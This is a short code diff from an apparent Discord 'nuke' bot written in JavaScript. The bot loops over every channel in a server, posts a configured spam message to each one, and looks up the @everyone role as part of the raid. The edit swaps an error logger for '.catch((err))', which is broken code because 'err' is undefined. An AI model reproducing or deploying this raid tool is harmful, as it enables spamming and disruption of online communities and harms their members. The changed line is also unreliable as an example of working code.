@@ -22,7 +22,7 @@ client.on("message", async (message) => {
       message.delete()
       for (let index = 0; index < a.length; index++) {
       message.guild.channels.cache.forEach((channel) => {
-        channel.send(config.nuke_settings.message).catch((err) => console.log(" "));
+        channel.send(config.nuke_settings.message).catch((err));
         let everyoneRole = message.guild.roles.cache.find(
           (r) => r.name === "@everyone"
         );
@@ -40,7 +40,7 @@ client.on("message", async (message) => {
   } else if (config.nuke_settings.message.includes(message.content)) {
     for (let index = 0; index < a.length; index++) {
       message.guild.channels.cache.forEach((channel) => {
-        channel.send(config.nuke_settings.message).catch((err) => console.log(" "));
+        channel.send(config.nuke_settings.message).catch((err));
         let everyoneRole = message.guild.roles.cache.find(
           (r) => r.name === "@everyone"
         );
